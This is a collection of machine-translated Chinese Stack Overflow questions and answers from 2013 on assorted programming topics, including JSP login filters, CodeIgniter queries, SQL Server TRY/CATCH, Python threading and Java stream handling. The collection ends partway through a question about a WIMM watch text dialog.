当我转到我的项目中存在的一个 JSP 页面时，直接在 URL 中写入 JSP 文件名，例如`localhost:8080/XYZ/abc.jsp`，在不验证登录的情况下，JSP 页面正在浏览器中打开。

我如何管理 JSP 页面和 servlet，以便在没有登录身份验证的情况下无法访问任何页面？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T04:38:54.347

我建议这样做的方法是构建一个[Filter](http://docs.oracle.com/javaee/6/api/javax/servlet/Filter.html)。这可用于在 servlet 或 JSP 处理请求之前和之后运行代码。您可以构建一个过滤器来检查用户的会话是否有效，如果不是，则将用户重定向到登录页面或“未经授权”页面。这也将使您免于向要保护的每个 JSP 文件添加身份验证逻辑。

也许[这篇博文](http://brendangraetz.wordpress.com/2010/06/17/use-servlet-filters-for-user-authentication/)会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T08:48:28.863

使用 Servlet 身份验证并使用 Servlet 安全性保护您的网页。

请阅读这里。

[如何保护我的 Java Web 应用程序？](https://stackoverflow.com/questions/9678959/how-to-secure-my-java-web-application)

# codeigniter - CodeIgniter：如何连接两个表列并使用类似活动记录来查询两者？

> ID：15825819
> 
> 赞同：0
> 
> 时间：2013-04-05T04:15:38.380
> 
> 标签：codeigniter, search, activerecord

```
public function search($query, $limit) {
    // output
    $output = "";
    // query
    $this->db->select("*");
    $this->db->from("products");
    $this->db->like("brand", $query);
    $this->db->or_like("model", $query);
    $this->db->limit($limit);
    $query = $this->db->get();
    // zero
    if ($query->num_rows() == 0) {
        $output .= "No results found";
        return $output;
    }
    // result
    foreach ($query->result_array() as $row) {
        // uri
        $uri2 = "{$this->base_url}specifications/{$row['brand']}-{$row['model']}";
        $uri2 = str_replace(" ", "-", $uri2);
        // price format
        $row['price'] = number_format($row['price']);
        // image url
        $image = "{$this->base_url}assets/images/products/{$row['category']}-{$row['brand']}-{$row['model']}/thumb.png";
        $image = str_replace(" ", "-", $image);
        $output .= "<ul class=\"product\">\n
            <a href=\"{$uri2}\">\n
                <li class=\"product-image\"><img src=\"{$image}\" height=\"108\" width=\"57\" alt=\"\"></li>\n
                <li class=\"product-brand\">{$row['brand']}</li>\n
                <li class=\"product-model\">{$row['model']}</li>\n
                <li class=\"product-price\">{$row['price']} <span class=\"green\">pkr</span></li>\n
            </a>\n
        </ul>\n";
    }
    // return
    return $output;
} 
```

在这里，我做了三种类型的查询：

1- 只包含品牌的查询（我得到结果）
2- 只包含模型的查询（我得到结果）
3- 两者都包含的查询（我没有得到结果）

如何完成以上三项任务？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T04:24:07.910

似乎您正在执行某种搜索，因此您想要获得的结果来自控制器或视图，您只需这样做，如果条件像这样，然后按

```
if ($brand_val != '' )
{  //put your where query here }

if ($model_val  != '' )
{  //put your where query here }

if ($brand_val != '' && $model_val  != ''   )
{  //put your where query here } 
```

希望这会给出想法

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T11:44:39.723

使用它来打印查询。

回声 $this->db->last_query();

然后尝试在您的 phpmyadmin 中执行该查询

# ios - IOS Storyboards：恢复ID就像Storyboard ID一样？

> ID：15825832
> 
> 赞同：2
> 
> 时间：2013-04-05T04:17:17.337
> 
> 标签：ios, storyboard

我正在使用 Steinberg 的 iBook 'IOS SToryboards' 来过渡到使用故事板。在第 30 页，作者的教程展示了将 Identity Inspector 中的“故事板 ID”设置为 redScene 的值。在书中的图形中，这显示为“识别”下的第一个字段

在 XCode 4.6.1 中，我看不到“Storyboard ID”，但确实看到了一个名为“Restoration ID”的字段，我将其设置为值“redScene”。然后我在 ViewController.m 中使用该值

```
 - (IBAction)redButtonTapped:(id)sender {
     UIViewController *redViewController = [[self storyboard]

 instantiateViewControllerWithIdentifier:@"redScene"];
     [self presentViewController:redViewController animated:YES completion:nil];

 } 
```

但是，当我运行我的应用程序时，我在引用“redScene”的那一行出现错误。我设置了一个异常断点，我看到了

(lldb)

我不确定在左侧调试器显示的值中查看什么，但我认为我的代码可能不知道“redScene”是谁。

我开始学习使用苹果文档，但我仍然不确定如何找到正确的阅读区域。我尝试在那里搜索“恢复 ID”和“故事板 ID”，但没有得到任何结果。

我在这篇文章中提供了足够的信息吗？

感谢您的任何想法

月桂树

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-04-05T04:25:34.133

我只是在故事板中玩了一会儿，我想我知道你的问题！如果您选择情节提要上的*视图*，它只会让您设置恢复 ID。您需要选择全*视图控制器*。您可以通过在情节提要面板的左侧层次结构中选择它，单击该视图控制器上的状态栏或视图下方的黑色底栏来执行此操作。

# visual-c++ - 列出所有出现的 Outlook 定期约会

> ID：15825836
> 
> 赞同：0
> 
> 时间：2013-04-05T04:17:31.333
> 
> 标签：visual-c++, com, mfc, outlook, mapi

MS Outlook 提供 MAPI 来访问 Outlook 日历项目。通过日历项目，它可以找到 Outlook 的所有定期和非定期约会。在定期约会的情况下，可以使用 AppointmentItem 的 RecurrencePattern 的 GetOccurence 函数找到所有重复约会的出现。GetOccurence 函数将获取日期和时间以返回该日期的事件。如果存在，它将返回，否则将给出异常。

如果定期约会的所有出现都具有相同的 StartTime 和 EndTime，则向 GetOccurence 提供开始时间输入，工作得很好。但是，如果修改了某个特定事件的 StartTime 和 EndTime，则 GetOccurence 将不会返回该事件。另一种方法是每天每隔 30 分钟检查一次。但这种方法似乎效率不高。

有人有更好的主意吗？

```
_ApplicationPtr olApp("Outlook.Application");
_NameSpacePtr olMAPI;
olMAPI = olApp->GetNamespace("MAPI");
hr = olMAPI->Logon("","",false,false);
MAPIFolderPtr olCalendarFolder = olMAPI->GetDefaultFolder(olFolderCalendar);
_ItemsPtr olCalendarItems = olCalendarFolder->GetItems();
_AppointmentItemPtr olAppt  = (_AppointmentItemPtr) olCalendarItems->GetFirst();
RecurrencePatternPtr recurPattern = olAppt->GetRecurrencePattern();
_AppointmentItemPtr _olAppt = recurPattern->GetOccurrence(recurPattern->GetPatternStartDate()+recurPattern->GetStartTime()); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T05:15:45.750

当然，使用 RecurrencePattern.Exceptions 集合 - 请参阅[http://msdn.microsoft.com/en-us/library/microsoft.office.interop.outlook.exceptions.aspx](http://msdn.microsoft.com/en-us/library/microsoft.office.interop.outlook.exceptions.aspx)

# sql-server - 为什么程序没有进入 catch 块

> ID：15825840
> 
> 赞同：1
> 
> 时间：2013-04-05T04:17:56.653
> 
> 标签：sql-server, sql-server-2008

我有一个存储过程，它正在从`Entity`我们的数据库中不存在的表中选择条目。

在下面的代码中，如果我执行存储过程，它不会进入 catch 块，而对于 try 块中的每个错误，它应该自动进入 catch 块。

我无法理解原因

```
Create PROCEDURE AddUpdateEntity
   (@Name VARCHAR(20),
    @Age SMALLINT)
AS
  BEGIN TRY
     SELECT NAME, Age FROM Entity WHERE NAME = @name AND Age = @Age
  END TRY
  BEGIN CATCH
     SELECT ERROR_NUMBER() StatusCode, ERROR_MESSAGE() [Message]
  END CATCH
GO

/* Command to execute the SP */
EXEC AddUpdateEntity 'Sandeep',20 
```

此执行语句显示错误“无效的实体对象”但未调用 catch 块。

存储过程已崩溃并显示消息

> 消息 208，级别 16，状态 1，过程 AddUpdateEntity，第 10 行
> Nom d'objet 'Entity' 无效。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-05T05:08:34.290

根据 MSDN（点击链接[http://msdn.microsoft.com/en-us/library/ms175976.aspx](http://msdn.microsoft.com/en-us/library/ms175976.aspx)）

> ### 不受 TRY…CATCH 构造影响的错误
> 
> TRY...CATCH 构造不会捕获以下条件：
> 
> *   严重性为 10 或更低的警告或信息性消息。
>     
>     
> *   严重性为 20 或更高的错误会停止会话的 SQL Server 数据库引擎任务处理。如果发生严重程度为 20 或更高的错误并且数据库连接未中断，则 TRY...CATCH 将处理该错误。
>     
>     
> *   注意，例如客户端中断请求或断开的客户端连接。
>     
>     
> *   当系统管理员使用 KILL 语句结束会话时。
>     
>     
> 
> 以下类型的错误发生在与 TRY...CATCH 构造相同的执行级别时，不会由 CATCH 块处理：
> 
> *   编译错误，例如语法错误，阻止批处理运行。
>     
>     
> *   在语句级重新编译期间发生的错误，例如由于延迟名称解析而在编译后发生的对象名称解析错误。
>     
>     
> 
> 这些错误将返回到运行批处理、存储过程或触发器的级别。
> 
> 如果在 TRY 块内的较低执行级别（例如，执行 sp_executesql 或用户定义的存储过程时）在编译或语句级重新编译期间发生错误，则错误发生在比 TRY…CATCH 构造更低的级别，并且将由关联的 CATCH 块处理。

希望以上描述能解决您的问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T04:23:06.503

它永远不会`CATCH`仅仅因为查询没有返回任何行而进入块。不返回任何行的 sql 查询不是错误；这是预期的行为。

正如其他人指出的那样，您看到的错误似乎是编译时错误，因为该`Entity`表不存在。

您可以尝试使用动态 sql[`sp_executesql`](http://msdn.microsoft.com/en-us/library/ms188001.aspx)来强制 SP 仅在运行时检查表是否存在。

```
BEGIN TRY
    DECLARE @sqlStr NVARCHAR(4000),
            @sqlParams NVARCHAR(400);
    SET @sqlStr = N'SELECT Name, Age FROM Entity WHERE Name=@Name AND Age=@Age';
    SET @sqlParams = '@Name VARCHAR(20), @Age SMALLINT';
    sp_executesql @sqlStr, @sqlParams, @Name = @Name, @Age = @Age
END TRY
BEGIN CATCH
    SELECT ERROR_NUMBER() StatusCode, ERROR_MESSAGE() [Message]
END CATCH 
```

# asp.net - 从 Global.asax 中的代码调用函数

> ID：15825843
> 
> 赞同：0
> 
> 时间：2013-04-05T04:18:14.740
> 
> 标签：asp.net, global-asax

如何从 Global.asax 中的 asp 页面（代码隐藏）访问控件或函数？

我将下面的代码用于后台任务，此代码每 60 秒检查一次新电子邮件，我想更新一个在 default.aspx 中显示新电子邮件计数的标签

```
void Application_Start(object sender, EventArgs e) 
{
    AddTask("CheckEmails", 10);
}

private void AddTask(string name, int seconds)
{
    OnCacheRemove = new CacheItemRemovedCallback(CacheItemRemoved);
    HttpRuntime.Cache.Insert(name, seconds, null, DateTime.Now.AddSeconds(seconds), Cache.NoSlidingExpiration,
    CacheItemPriority.NotRemovable, OnCacheRemove);
 }//addTask

 public void CacheItemRemoved(string k, object v, CacheItemRemovedReason r)
 {
    //Check New Emails and update label from .aspx
    AddTask(k, Convert.ToInt32(v));
 }//CacheItemRemoved 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T04:23:56.970

你为什么要这样做。请提供更多信息。
虽然您可以创建一个对象`Default page`并调用它的函数。
但是，如果这与页面无关，那么只有它很好用。

## 编辑 1

您不需要它来调用 from `application start`。
**您可以在页面加载时调用此函数（在登录页面后调用）。**
您可以使用相同的键检查缓存中的现有值。
如果存在，则不要修改缓存
否则将您的值放入缓存中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T04:33:33.017

为常用函数创建一个单独的类，将其放在 app_code 文件夹中，然后从 Default.aspx 和 global.asax 访问此函数....

# c++ - 在 C++ 中将结构数组展平为多个数组

> ID：15825844
> 
> 赞同：0
> 
> 时间：2013-04-05T04:18:20.390
> 
> 标签：c++, arrays, struct, flatten

源码了解情况：

```
struct s { 
    int i; 
    float f 
};
const int cnt = 10;

s *source = new s[cnt];
/*... fill source ...*/

int *dest_i = new int[cnt];
float *dest_f = new float[cnt];

for (int x = 0; x < cnt; x++) {
    dest_i[x] = source[x].i;
    dest_f[x] = source[x].f;
} 
```

那么，问题来了：有没有比用循环遍历数组更快的方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T05:23:42.457

你可以展开你的循环。这就是我能想到的。

自己编写是一个相当没有意义的优化，如果你启用它，编译器可以尝试为你做（在 gcc 中，编译`--funroll-loops`）

# java - setReadable(true) 在 setReadable(false) 之后不起作用

> ID：15825851
> 
> 赞同：0
> 
> 时间：2013-04-05T04:19:34.693
> 
> 标签：java, file-io

我正在测试我编写的方法是否引发了文件异常。我通过将文件的读取权限设置为 false 来触发异常

```
 File f = new File(unreadableFile);
     f.setReadable(false);
     // Run test
     f.setReadable(true); 
```

问题是 f.setReadable(true) 没有将权限设置回应有的状态。我有另一个测试正常操作模式的测试，它总是失败，因为 f.setReadable(true) 没有将文件恢复到运行异常测试之前的状态。我检查了磁盘上的权限，这是错误的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T04:32:18.877

引用文档

> **当且仅当操作成功时返回 true**。如果用户无权更改此抽象路径名的访问权限，则操作将失败。如果 readable 为 false 并且底层文件系统没有实现读权限，那么操作将失败。

检查返回值并检查您是否有权执行该操作。该操作与 delete() 非常相似，如果您没有权限，则可能会失败。

# database - nodejs + 连接 + 自定义会话存储

> ID：15825852
> 
> 赞同：1
> 
> 时间：2013-04-05T04:19:43.457
> 
> 标签：database, node.js, memcached, connect

有没有办法用自定义功能覆盖连接会话存储？

我来自 Python Flask 框架，在那里我构建了一个混合内存缓存 + 数据库会话处理程序。基本上我使用 memcache 作为主要会话持有者，但是在更新时我将数据保存到数据库中，并且我还每 5 分钟在会话处于活动状态时更新数据库。

这样做可以减少对数据库的请求量，但在存在内存或 memcache 问题时让系统始终回退到数据库。

有没有办法覆盖或扩展获取/保存/销毁功能？

# php - 需要帮助 zozo (ZOZO TOWN) api 详细信息

> ID：15825855
> 
> 赞同：0
> 
> 时间：2013-04-05T04:20:04.447
> 
> 标签：php, web-services, api, rest, affiliate

我正在使用 amazon、rakutan 和 zozo 使用 PHP 创建 api japan 附属商店。我得到了 amazon 和 rakutan api 的详细信息。但在 zozo(ZOZO TOWN) 中找不到资源。任何人都成功地完成了这个 api。请指导我。

ZOZO 的 WEB SERVICES 主页在哪里？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T05:33:06.013

因为去年 ZOZO 附属公司已经关闭，所以没有关于 ZOZO 附属公司的资源。

[http://kirei.biglobe.ne.jp/news/detail/20121111105027_fsn2012-11-11-zozotown-affiliate-close-](http://kirei.biglobe.ne.jp/news/detail/20121111105027_fsn2012-11-11-zozotown-affiliate-close-)

# asp.net-mvc - 具有类范围属性的淘汰赛

> ID：15825858
> 
> 赞同：0
> 
> 时间：2013-04-05T04:20:30.493
> 
> 标签：asp.net-mvc, knockout.js

我正在使用 Knockout 并将 ViewModel 绑定到我的 ASP.Net MVC 4 项目中的数据对象，如下所示：

```
$(document).ready(function() {
properties = @Html.Raw(Json.Encode(Model));
selectedProperty = properties[0];
viewModel = { properties: ko.mapping.fromJS(@Html.Raw(Json.Encode(Model))), selectedProperty:  ko.observable()}; 
viewModel.setItem = function(item) {
viewModel.selectedProperty(item);   
}
ko.applyBindings(viewModel); 
```

现在我想重构我的 JavaScript，以便将逻辑封装在一个类中：

```
RealEstate.Search = function (properties) {
    this.properties = properties;
    this.selectedProperty = this.properties[0];
    this.viewModel = { properties: ko.mapping.fromJS(this.properties), selectedProperty:  ko.observable()}; 
    this.viewModel.setItem = function(item) {
    viewModel.selectedProperty(item);   
    }        
    ko.applyBindings(this.viewModel);
} 
```

我正在我的 HTML 页面中实例化该对象，如下所示：

```
$(document).ready(function() {
search = new RealEstate.Search(@Html.Raw(Json.Encode(Model))); 
     } 
```

现在，我收到以下错误：
*错误：无法解析绑定。消息：ReferenceError：“属性”未定义；绑定值：foreach:properties*

这是绑定到 ViewModel 的表格的 HTML 片段：

```
 <div id="divDataTable" data-bind="with: properties">

        <table id="dataTable" class="tablesorter">
            <thead>
                <tr>
                    <th>Address
                    </th>
                    <th>
                       Suburb
                    </th>
                    <th>Price
                    </th>
                    <th>Beds
                    </th>
                    <th>Baths
                    </th>
                    <th>Days Listed
                    </th>
                </tr>
            </thead>
            <tbody data-bind="foreach: properties">
                <tr data-bind="click: $root.setItem">
                    <td>
                        <label data-bind="text: $data.Street"></label>
                        <input data-bind="attr: { value : $index(), id : $index(), name : $index() }" type="hidden" />
                    </td>
                    <td data-bind="text: $data.Suburb"></td>
                    <td data-bind="text: $data.PriceFormatted"></td>
                    <td data-bind="text: $data.NumOfBedrooms"></td>
                    <td data-bind="text: $data.NumOfBathrooms"></td>
                    <td data-bind="text: $data.DaysListed"></td>
                </tr>
            </tbody>
        </table>
    </div>
</section>
<div id="divProperty">
    <aside class="float-right" data-bind="with: selectedProperty">
        <table>
            <tr>
                <td>
                    <label data-bind="text: $data.Street"></label>
                </td>
                <td>
                    <label data-bind="text: $data.PriceFormatted"></label>
                </td>
            </tr>
            <tr>
                <td colspan="2">
                    <img src="#" /></td>
            </tr>
            <tr>
                <td>Beds:
                <label data-bind="text: $data.NumOfBedrooms"></label>
                </td>
                <td>On OZMite:
                <label data-bind="text: $data.DaysListed"></label>
                </td>
            </tr>
            <tr>
                <td>Baths:
                <label data-bind="text: $data.NumOfBathrooms"></label>
                </td>
                <td>Year built:</td>
            </tr>
        </table>
    </aside> 
```

如果有人能阐明我做错了什么，我将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T05:17:54.973

随着`data-bind="with: properties"`你已经`properties`在你的`div`.

所以当你写`<tbody data-bind="foreach: properties">`KO 试图在你的数组中找到`properties` 属性。`properties`

您需要的[是](http://knockoutjs.com/documentation/binding-context.html)使用`$data`.

所以你的 foreach 应该是这样的：

```
<tbody data-bind="foreach: $data">       
   ...
</todby> 
```

# python - 访问字典中的键

> ID：15825861
> 
> 赞同：1
> 
> 时间：2013-04-05T04:20:58.563
> 
> 标签：python, key, dictionary

如果我想访问字典中的所有键并检查键（ATGC）之类的序列是否具有“GC”。如何访问密钥以检查它是否包含字符串“GC”？

非常感谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T04:25:49.633

```
matches = [ k for k in yourdictionary.keys() if 'gc' in k.lower() ]
number_of_matches = len(matches) 
```

你也可以做一个`regex`or `string.find`（如果没有找到则返回 -1 ）或`string.count`-- 但`if substring in string`可以工作并且更清楚地说明这一点。我还将密钥转换为小写并与小写字符串进行比较，因此它可以有效地进行不区分大小写的匹配。

# python - 编程理论众神来袭：Python 2.x 中的 target = foo 是什么？

> ID：15825863
> 
> 赞同：0
> 
> 时间：2013-04-05T04:21:05.130
> 
> 标签：python, multithreading, multiprocessing

通常，当我浏览此问答网站时，使用多线程和处理的答案告诉我使用如下格式：

```
(target=foo, args=(bar, baz)) 
```

它最常用于[多处理](https://stackoverflow.com/q/6893968/1993598)和[多线程](https://stackoverflow.com/a/15318142/1993598)（至少在我有限的知识范围内）。

我的问题是，这是*什么`target`意思，有人可以解释它是如何使用的吗？*

我无法在[文档](http://docs.python.org/2/library/thread.html)或其他地方找到一个好的解释。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-05T04:54:30.940

`target`的构造函数中的关键字参数`threading.Thread`设置新线程的入口点。这可以是具有`__call__`方法的函数或对象。

这是一个使用函数的示例：

```
import threading

def foo(number, name):
    print 'Hello from new thread'
    print 'Here are some arguments:', number, name

thread = threading.Thread(target=foo, args=(5,'bar'))
thread.start()

thread.join() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T04:29:24.717

`target`只是在新线程/进程中调用的可调用对象。

从[`threading`文档](http://docs.python.org/2/library/threading.html#threading.Thread)中：

> `target`是方法调用的可调用对象`run()`。默认为`None`，表示不调用任何内容。

# java - 如何在没有 OutOfMemory 错误的情况下从 FileInputStream 获取字节数组

> ID：15825865
> 
> 赞同：4
> 
> 时间：2013-04-05T04:21:28.040
> 
> 标签：java, android

我有一个包含 200MB 数据的 FileInputStream。我必须从输入流中检索字节。

我正在使用下面的代码将 InputStream 转换为字节数组。

```
private byte[] convertStreamToByteArray(InputStream inputStream) {
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    try {
        int i;
        while ((i = inputStream.read()) > 0) {
            bos.write(i);
        }
    } catch (IOException e) {
        e.printStackTrace();
    }
    return bos.toByteArray();
} 
```

在将如此大的数据转换为字节数组时，我遇到了 OutOfMemory 异常。

请让我知道将 InputStream 转换为字节数组的任何可能的解决方案。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-05T10:31:51.607

为什么要在内存中保存 200MB 的文件？你打算用字节数组做什么？

如果要将其写入 OutputStream，请先准备好 OutputStream，然后一次读取 InputStream 一个块，同时将块写入 OutputStream。你永远不会在内存中存储超过块。

例如：

```
 public static void pipe(InputStream is, OutputStream os) throws IOException {

        int read = -1;
        byte[] buf = new byte[1024];

        try {
            while( (read = is.read(buf)) != -1) {
                os.write(buf, 0, read);
            }
        }
        finally {
            is.close();
            os.close();
        }
    } 
```

此代码将采用两个流并将一个流传输到另一个。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-05T04:37:42.913

Android 应用程序具有有限的堆内存，并且取决于设备。目前大多数新设备都有 64 个，但它或多或少取决于制造商。我见过设备带有 128 MB 堆内存。

**那么这到底是什么意思呢？**

它只是意味着无论可用的物理内存如何，您的应用程序都不允许增长超过分配的堆大小。

从 Android API 级别 11 开始，您可以使用清单标记请求额外的内存，`android:largeHeap="true"`这将使您的堆大小增加一倍。这只是意味着如果您的设备有 64 个，您将获得 128 个，如果是 128 个，您将获得 256 个。但这不适用于较低的 API 版本。

我不确定您的要求是什么，但是如果您打算通过 HTTP 发送，则读取文件发送数据并再次读取。您也可以对文件 IO 遵循相同的过程。只是为了确保不要使用超过可用堆大小的内存。只是要格外小心，请确保为应用程序执行留出一些空间。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-05T04:37:29.837

您的问题不在于如何将 InputStream 转换为字节数组，而是该数组太大而无法放入内存。您别无选择，只能找到一种方法以较小的块处理来自 InputStream 的字节。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-05T04:28:21.463

您可能需要大量增加堆大小。尝试使用标志运行 Java 虚拟机`-Xms384m -Xmx384m`（它指定 384 兆字节的起始和最大堆大小，除非我错了）。有关可用选项的旧版本，请参阅[此](http://docs.oracle.com/javase/1.5.0/docs/tooldocs/windows/java.html)内容：根据特定的虚拟机和平台，您可能需要进行一些挖掘，但 -Xms 和 -Xmx 应该可以帮助您克服困难。

现在，您可能真的不应该将它读入字节数组，但如果那是您的应用程序，那么...

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2013-04-05T05:00:15.757

试试这个代码

```
private byte[] convertStreamToByteArray(InputStream inputStream) {
ByteArrayOutputStream byteOutStream = new ByteArrayOutputStream();
                    int readByte = 0;
        byte[] buffer = new byte[2024];

                    while(true)
                    {
                        readByte = inputStream.read(buffer);
                        if(readByte == -1)
                        {
                            break;
                        }
                        byteOutStream.write(buffer);
                    }
                    inputStream.close();
                    byteOutStream.flush();
                    byteOutStream.close();
                    byte[] byteArray= byteOutStream.toByteArray();
                    return byteArray;
} 
```

尝试从 InputStream 读取数据块。

# ios - UIViewController的视图的属性框在UIScrollView下使用单个子视图时不起作用

> ID：15825866
> 
> 赞同：0
> 
> 时间：2013-04-05T04:21:32.903
> 
> 标签：ios, uiview, uiscrollview

在使用 UIScrollView 的缩放功能之前，一切都很好。代码如下：

```
 UIScrollView* scrollView = [[UIScrollView alloc]init];
   for(int i=0; i < foodIntroCount; ++i) {
        UIImage* image = [UIImage imageNamed:@"7_1.jpg"];
        UIImageView * imgView = [[UIImageView alloc]initWithImage:image];
        imgView.frame = CGRectMake(0, height*i, width, height);
        [scrollView addSubView:imgView];
   }

   scrollView.contentSize =  CGSizeMake(width, height*(foodIntroCount+1)) ;
   scrollView.pagingEnabled = YES; 
   scrollView.showsVerticalScrollIndicator = NO;
   scrollView.showsHorizontalScrollIndicator = NO;
   scrollView.bounces = NO;
   scrollView.delegate = self;

   _foodWineViewController = [[OHFoodWineViewController alloc]initWithCategoryData:_foodData];
   UIView* wineView = _foodWineViewController.view;
   wineView.frame = CGRectMake(0, height*(foodIntroCount), width, height);
   [scrollView addSubview:wineView]; 
```

添加缩放功能后，代码如下所示：

```
UIScrollView* scrollView = [[UIScrollView alloc]init];
UIView* zoomView = [[UIView alloc]init];
   for(int i=0; i < foodIntroCount; ++i) {
        UIImage* image = [UIImage imageNamed:@"7_1.jpg"];
        UIImageView * imgView = [[UIImageView alloc]initWithImage:image];
        imgView.frame = CGRectMake(0, height*i, width, height);
        [zoomView addSubView:imgView];
   }

   scrollView.contentSize =  CGSizeMake(width, height*(foodIntroCount+1)) ;
   scrollView.pagingEnabled = YES; 
   scrollView.showsVerticalScrollIndicator = NO;
   scrollView.showsHorizontalScrollIndicator = NO;
   scrollView.bounces = NO;
   scrollView.delegate = self;
   scrollView.maximumZoomScale = 2.0;

   _foodWineViewController = [[OHFoodWineViewController alloc]initWithCategoryData:_foodData];
   UIView* wineView = _foodWineViewController.view;
   wineView.frame = CGRectMake(0, height*(foodIntroCount), width, height);
   [zoomView addSubView:wineView];
   [scrollView addSubview:zoomView]; 
```

问题是：wineView 显示在第一页，而不是 foodIntroCount+1 页面。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T05:28:23.577

如果您想一个接一个地垂直添加子视图，您的代码应该考虑之前的**y 位置**和**高度。**所以你的代码应该如下所示

```
imgView.frame = CGRectMake(0, height*i+y, width, height); 
```

代码没有经过测试，试试这个..

# text - 如何设置监听器？

> ID：15825871
> 
> 赞同：0
> 
> 时间：2013-04-05T04:22:37.313
> 
> 标签：text, input, dialog

我想我需要一个听众，但无法设置。在下面的代码中，时间对话框和日期对话框都有效。出现带有滚轮的小对话框，我选择一个日期/时间，然后选择我的日期。但我无法让文本输入工作。我已经从一个示例程序中尝试了此代码的多次迭代：bnBodyEntered = true; bodyDialog = new TextInputDialog(this); bodyDialog.setText("body"); 这段代码显示了带有字母滚轮的文本对话框，但是程序跑过了它，当我输入几个字母并选择时，什么也没发生。这是因为我没有设置监听器。所以我添加了（如前所述）bodyDialog.setOnDismissListener(textSetListener); 使用几个“setOn----Listener”值，它要么仍然运行过去，要么我得到各种编译错误。

这是给我的 WIMMOne 手表的，所以版本 7，没有虚拟键盘。它需要是一个对话框。

（注意：我在发布之前删除了一些评论代码 - 可能还有更多，所以如果它没有从 - 抱歉。）

谢谢，克拉克

```
/******************************
 * Wimm imports
 ******************************/
import com.wimm.framework.app.Dialog;
import com.wimm.framework.app.DatePickerDialog;
import com.wimm.framework.app.DatePickerDialog.OnDateSelectedListener;
import com.wimm.framework.app.LauncherActivity;
import com.wimm.framework.app.TextInputDialog;
import com.wimm.framework.app.TimePickerDialog;
import com.wimm.framework.app.TimePickerDialog.OnTimeSelectedListener;

@ Override
public void onCreate(Bundle savedInstanceState)
   {
    super.onCreate(savedInstanceState);
    Log.d("RemindEA","01S onCrt");
    setContentView(R.layout.reminder_edit_activity);

            . . . 
            . . . 

    mBodyText  = (EditText)findViewById(R.id.body);
    mTimeButton = (Button)findViewById(R.id.reminder_time);
    mDateButton = (Button)findViewById(R.id.reminder_date);

    mConfirmButton = (Button)findViewById(R.id.confirm);
    Log.d("RemindEA","10S onCrtV df");

    //-------------  TEXT INPUT
    mBodyText.setOnClickListener( new View.OnClickListener() 
               {
        public void onClick(View v)
        {
         Log.d("RemindEA","21> onClkV:Body");
                     showDialog(BODY_DIALOG_ID);
                 Log.d("RemindEA","22< onClkV:Body:" + strBody);

         mBodyText.setText(bodyDialog.getText());
            return;
         }
               } );

    //--------------------------  TIME INPUT
    mTimeButton.setOnClickListener( new View.OnClickListener()     
           {
        @Override
        public void onClick(View v)
           {
        Log.d("RemindEA","25> onClkV:Time");
        showDialog(TIME_DIALOG_ID);
        Log.d("RemindEA","26< onClkV:Time");
           }
               } );

    //--------------------------  DATE INPUT
    mDateButton.setOnClickListener( new View.OnClickListener()
       {
        @Override
        public void onClick(View v)
           {
        Log.d("RemindEA","30> onClkV:Time");
        showDialog(DATE_DIALOG_ID);
        Log.d("RemindEA","31< onClkV:Time");
           }
           }  );

    protected Dialog onCreateDialog(int id) 
     {
  Log.d("RemindEA","70S Dialog:" + id);
  switch (id) 
     {
      // if we want a time dialog--------------
      case TIME_DIALOG_ID:
         Log.d("RemindEA","71S TIME_DIALOG_ID");
     timeDialog = new TimePickerDialog(this);
     timeDialog.setTimeSelectedListener(timeSetListener);
             timeDialog.setTime(mCalendar.get(Calendar.HOUR_OF_DAY),
                                 mCalendar.get(Calendar.MINUTE));
     Log.d("RemindEA","73S TIME_D:" + timeDialog);
     return timeDialog;

    // if we want a date dialog ---------------
    case DATE_DIALOG_ID:
       Log.d("RemindEA","75S DATE_DIALOG_ID-26");
       mCalendar = Calendar.getInstance();
       Log.d("RemindEA","76S DATE_DIALOG_ID-27");
       dateDialog = new DatePickerDialog(this);
       dateDialog.setDateSelectedListener(dateSetListener);
       dateDialog.setDate(mCalendar.get(Calendar.DAY_OF_MONTH),
               mCalendar.get(Calendar.MONTH   ));
       Log.d("RemindEA","77S DATE_D:" + dateDialog);
       return dateDialog;

    // if we want text input dialog ---------------------
    case BODY_DIALOG_ID:
       Log.d("RemindEA","80S BODY_DIALOG_ID");
       bnBodyEntered = true;
       Log.d("RemindEA","81S TITLE");
       bodyDialog = new TextInputDialog(this);
          //---> ADDED LINE BELOW TO CREATE A LISTENER: GET ERROR <-----
          // ERROR BELOW: setOnDismissListener cannot be resolved to a type
               bodyDialog.setOnDismissListener(textSetListener);
          //------------------------------------------
                //ALSO //.setOnKeyListener(onKeyListener) - others     
           Log.d("RemindEA","82S New");
       bodyDialog.setText("body");
       Log.d("RemindEA","83X:" + bodyDialog);
       return bodyDialog;   
      }
      return null;
    } 

    private OnTimeSelectedListener timeSetListener = new OnTimeSelectedListener() 
       {
        public void onTimeSelected(int arg0, int arg1) 
       {
    Log.d("RemindEA","90S onTimeSelected");
    intHH = arg0;
    intMN = arg1;
    Log.d("RemindEA","91S schedule:" + intHH + ":" +  intMN);
    //updateDisplay();
       }
       };

